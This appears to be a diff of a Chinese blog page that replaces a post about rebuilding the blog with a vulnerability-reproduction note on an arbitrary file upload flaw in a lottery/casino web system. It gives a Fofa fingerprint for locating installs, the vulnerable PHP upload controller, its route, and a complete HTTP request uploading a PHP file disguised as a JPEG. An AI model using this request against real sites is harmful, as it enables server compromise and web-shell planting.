@@ -3,24 +3,28 @@
 <html class="article-header-style-default">
 <head>
 	
-	<title>重构博客 - wo1fyr的随笔</title>
+	<title>记录一点渗透学习经历(持续更新) - wo1fyr的随笔</title>
 	<meta charset="utf-8">
 	
 		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	
-	<meta name="description" content="为什么突然要重构因为原本的博客是大二那会做的，修修补补的做的乱七八糟（其实还有好多别的事情也是），痛定思痛要重新做的更规范，所以重新搭建了一下，换了一个主题，虽然这个主题是移植版本，但是作为一个笔记博客来说完全够了">
+	<meta name="description" content="免责声明:文章中涉及的程序(方法)仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者不承担任何法律及连带责任！！! 某火cai票娱乐城系统前台任意文件上传漏洞原文仅作学习用 Fofa指纹:”&#x2F;action-sheet-fix.css” 框架:Leavel 漏洞点位于 &#x2F;api&#x2F;app&#x2F;controller&#x2F;api">
 <meta property="og:type" content="article">
-<meta property="og:title" content="重构博客">
-<meta property="og:url" content="http://wo1fyr.github.io/2026/04/23/hello-world/index.html">
+<meta property="og:title" content="记录一点渗透学习经历(持续更新)">
+<meta property="og:url" content="http://wo1fyr.github.io/2026/04/24/%E6%B8%97%E9%80%8F%E7%BB%8F%E5%8E%86/index.html">
 <meta property="og:site_name" content="wo1fyr的随笔">
-<meta property="og:description" content="为什么突然要重构因为原本的博客是大二那会做的，修修补补的做的乱七八糟（其实还有好多别的事情也是），痛定思痛要重新做的更规范，所以重新搭建了一下，换了一个主题，虽然这个主题是移植版本，但是作为一个笔记博客来说完全够了">
+<meta property="og:description" content="免责声明:文章中涉及的程序(方法)仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者不承担任何法律及连带责任！！! 某火cai票娱乐城系统前台任意文件上传漏洞原文仅作学习用 Fofa指纹:”&#x2F;action-sheet-fix.css” 框架:Leavel 漏洞点位于 &#x2F;api&#x2F;app&#x2F;controller&#x2F;api">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://wo1fyr.github.io/assets/img/hello-world/%E6%81%8D%E7%84%B6%E5%B0%8F%E6%82%9F.webp">
-<meta property="article:published_time" content="2026-04-23T02:11:26.760Z">
-<meta property="article:modified_time" content="2026-04-23T08:36:39.280Z">
+<meta property="og:image" content="http://wo1fyr.github.io/img/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E6%9F%90%E7%81%ABcai%E7%A5%A8%E5%A8%B1%E4%B9%90%E5%9F%8E/1.png">
+<meta property="og:image" content="http://wo1fyr.github.io/img/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E6%9F%90%E7%81%ABcai%E7%A5%A8%E5%A8%B1%E4%B9%90%E5%9F%8E/2.png">
+<meta property="og:image" content="http://wo1fyr.github.io/img/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E6%9F%90%E7%81%ABcai%E7%A5%A8%E5%A8%B1%E4%B9%90%E5%9F%8E/3.png">
+<meta property="article:published_time" content="2026-04-24T05:17:00.000Z">
+<meta property="article:modified_time" content="2026-04-24T05:17:46.879Z">
 <meta property="article:author" content="wo1fyr">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://wo1fyr.github.io/assets/img/hello-world/%E6%81%8D%E7%84%B6%E5%B0%8F%E6%82%9F.webp">
+<meta name="twitter:image" content="http://wo1fyr.github.io/img/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E6%9F%90%E7%81%ABcai%E7%A5%A8%E5%A8%B1%E4%B9%90%E5%9F%8E/1.png">
 
 	<meta name="theme-color" content="#5e72e4">
 	<meta name="theme-color-rgb" content="94,114,228">
@@ -569,13 +573,13 @@
 	<article class="post post-full card bg-white shadow-sm border-0 ">
 	<header class="post-header text-center">
 		
-		<a class="post-title" href="/2026/04/23/hello-world/">重构博客</a>
+		<a class="post-title" href="/2026/04/24/%E6%B8%97%E9%80%8F%E7%BB%8F%E5%8E%86/">记录一点渗透学习经历(持续更新)</a>
 		<div class="post-meta">
 			
 						
 						<div class="post-meta-detail post-meta-detail-time">
 							<i class="fa fa-clock-o" aria-hidden="true"></i>
-							<time title="发布于 2026-4-23 10:11:26 | 编辑于 2026-4-23 16:36:39">2026-4-23 10:11
+							<time title="发布于 2026-4-24 13:17:00 | 编辑于 2026-4-24 13:17:46">2026-4-24 13:17
 							</time>
 						</div>
 					
@@ -584,7 +588,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-categories">
 							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
-							<a class="post-meta-detail-catagory-link" href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a>
+							<a class="post-meta-detail-catagory-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
 						</div>
 					
 						
@@ -602,7 +606,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-words">
 							<i class="fa fa-file-word-o" aria-hidden="true"></i>
-							99 字
+							711 字
 						</div>
 					
 						
@@ -610,7 +614,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-readingtime">
 							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
-							1 分钟
+							3 分钟
 						</div>
 					
 		</div>
@@ -618,8 +622,27 @@
 	</header>
 
 	<div class="post-content" id="post_content">
-		<h1 id="为什么突然要重构"><a href="#为什么突然要重构" class="headerlink" title="为什么突然要重构"></a>为什么突然要重构</h1><p>因为原本的博客是大二那会做的，修修补补的做的乱七八糟（其实还有好多别的事情也是），痛定思痛要重新做的更规范，所以重新搭建了一下，换了一个主题，虽然这个主题是移植版本，但是作为一个笔记博客来说完全够了</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/assets/img/hello-world/%E6%81%8D%E7%84%B6%E5%B0%8F%E6%82%9F.webp" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+		<p><strong>免责声明:文章中涉及的程序(方法)仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者不承担任何法律及连带责任！！!</strong></p>
+<h1 id="某火cai票娱乐城系统前台任意文件上传漏洞"><a href="#某火cai票娱乐城系统前台任意文件上传漏洞" class="headerlink" title="某火cai票娱乐城系统前台任意文件上传漏洞"></a>某火cai票娱乐城系统前台任意文件上传漏洞</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/axqS8Tq_4-vC8Q21eVT11A">原文</a>仅作学习用</p>
+<p>Fofa指纹:”&#x2F;action-sheet-fix.css”</p>
+<p>框架:Leavel</p>
+<p>漏洞点位于 &#x2F;api&#x2F;app&#x2F;controller&#x2F;api&#x2F;WithdrawController.php 控制器的uploadQrCode 方法</p>
+<p>通过 $file-&gt;move() 上传文件，且过滤不严格，导致任意文件上传漏洞产生</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uploadQrCode</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$request</span>-&gt;userId ?? <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$userId</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">401</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;请先登录&#x27;</span>, <span class="string">&#x27;data&#x27;</span> =&gt; <span class="literal">null</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="variable">$file</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable">$file</span> || !<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">isValid</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">400</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;请选择要上传的图片&#x27;</span>, <span class="string">&#x27;data&#x27;</span> =&gt; <span class="literal">null</span>]);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="variable">$allowedTypes</span> = [<span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>, <span class="string">&#x27;image/gif&#x27;</span>, <span class="string">&#x27;image/webp&#x27;</span>];</span><br><span class="line">      <span class="variable">$uploadMimeType</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getUploadMimeType</span>();</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$uploadMimeType</span>, <span class="variable">$allowedTypes</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">400</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;只支持 JPG、PNG、GIF、WEBP 格式图片&#x27;</span>, <span class="string">&#x27;data&#x27;</span> =&gt; <span class="literal">null</span>]);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getSize</span>() &gt; <span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">400</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;图片大小不能超过5MB&#x27;</span>, <span class="string">&#x27;data&#x27;</span> =&gt; <span class="literal">null</span>]);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="variable">$ext</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getUploadExtension</span>() ?: <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="string">&#x27;qrcode/&#x27;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Ymd&#x27;</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$userId</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="variable">$dir</span> = <span class="title function_ invoke__">public_path</span>() . <span class="string">&#x27;/uploads/qrcode/&#x27;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Ymd&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="variable">$savePath</span> = <span class="title function_ invoke__">public_path</span>() . <span class="string">&#x27;/uploads/&#x27;</span> . <span class="variable">$filename</span>;</span><br><span class="line">      <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">move</span>(<span class="variable">$savePath</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="variable">$host</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">host</span>();</span><br><span class="line">      <span class="variable">$scheme</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-Forwarded-Proto&#x27;</span>) ?: (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;scheme&#x27;</span>) ?: <span class="string">&#x27;http&#x27;</span>);</span><br><span class="line">      <span class="variable">$url</span> = <span class="variable">$scheme</span> . <span class="string">&#x27;://&#x27;</span> . <span class="variable">$host</span> . <span class="string">&#x27;/uploads/&#x27;</span> . <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([</span><br><span class="line">                  <span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">                  <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;上传成功&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;data&#x27;</span> =&gt; [</span><br><span class="line">                  <span class="string">&#x27;url&#x27;</span> =&gt; <span class="variable">$url</span></span><br><span class="line">                  ]</span><br><span class="line">                  ]);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">      \support<span class="title class_">\Log</span>::<span class="title function_ invoke__">error</span>(<span class="string">&#x27;上传收款码失败: &#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">500</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;上传失败: &#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>(), <span class="string">&#x27;data&#x27;</span> =&gt; <span class="literal">null</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查看 &#x2F;api&#x2F;config&#x2F;route.php 路由文件，查找 uploadQrCode 方法对应的路由</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">group</span>(<span class="string">&#x27;/api/v1&#x27;</span>, function () &#123;</span><br><span class="line">      <span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/withdraw/upload-qrcode&#x27;</span>, [app\controller\api<span class="title class_">\WithdrawController</span>::<span class="variable language_">class</span>, <span class="string">&#x27;uploadQrCode&#x27;</span>]);</span><br><span class="line">&#125;)-&gt;<span class="title function_ invoke__">middleware</span>([</span><br><span class="line">    app\middleware<span class="title class_">\AuthMiddleware</span>::<span class="variable language_">class</span>,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
+
+<p>实际请求路径为 &#x2F;api&#x2F;v1&#x2F;withdraw&#x2F;upload-qrcode </p>
+<p>然后去主页注册一个账号，这系统邀请码是选填的，可以随便注册</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E6%9F%90%E7%81%ABcai%E7%A5%A8%E5%A8%B1%E4%B9%90%E5%9F%8E/1.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>拿到 authorization，之后替换Authorization直接发送请求包</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v1/withdraw/upload-qrcode</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>替换IP</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>199</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryT2GEWpMD4SoAY0IG</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>替换token</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryT2GEWpMD4SoAY0IG</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryT2GEWpMD4SoAY0IG--</span></span><br></pre></td></tr></table></figure>
+
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E6%9F%90%E7%81%ABcai%E7%A5%A8%E5%A8%B1%E4%B9%90%E5%9F%8E/2.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E6%9F%90%E7%81%ABcai%E7%A5%A8%E5%A8%B1%E4%B9%90%E5%9F%8E/3.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 
 	</div>
@@ -628,6 +651,11 @@
 
 	
 
+	
+		<div class="post-tags">
+			<i class="fa fa-tags" aria-hidden="true"></i>
+			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a><a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+		</div>
 	
 </article>
 
@@ -668,7 +696,7 @@
 				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
 			</button>
 		</a>
-		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://wo1fyr.github.io/2026/04/23/hello-world/&text=重构博客" tooltip="分享到 Telegram">
+		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://wo1fyr.github.io/2026/04/24/%E6%B8%97%E9%80%8F%E7%BB%8F%E5%8E%86/&text=记录一点渗透学习经历(持续更新)" tooltip="分享到 Telegram">
 			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
 				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
 			</button>
@@ -685,11 +713,11 @@
 </div>
 <script type="text/javascript">
 	socialShare("#share", {
-	    title : '重构博客',
-	    description : `为什么突然要重构因为原本的博客是大二那会做的，修修补补的做的乱七八糟（其实还有好多别的事情也是），痛...`,
+	    title : '记录一点渗透学习经历(持续更新)',
+	    description : `免责声明:文章中涉及的程序(方法)仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律...`,
 	    wechatQrcodeTitle : "分享到微信",
 	    wechatQrcodeHelper : '微信扫描二维码',
-	    source : 'http://wo1fyr.github.io/2026/04/23/hello-world/'
+	    source : 'http://wo1fyr.github.io/2026/04/24/%E6%B8%97%E9%80%8F%E7%BB%8F%E5%8E%86/'
 	});
 	$("#share_show")[0].onclick = function(){
 		$("#share_container").addClass("opened");
@@ -738,7 +766,7 @@
 
 
 
-<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/2026/04/23/CTF-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%881%EF%BC%89/" rel="prev"> PHP简单代码审计（1）</a></div><div class="post-navigation-item post-navigation-next"></div></div>
+<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/2026/04/24/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/" rel="next"> PHP代码审计笔记(持续更新)</a></div></div>
 
 
 
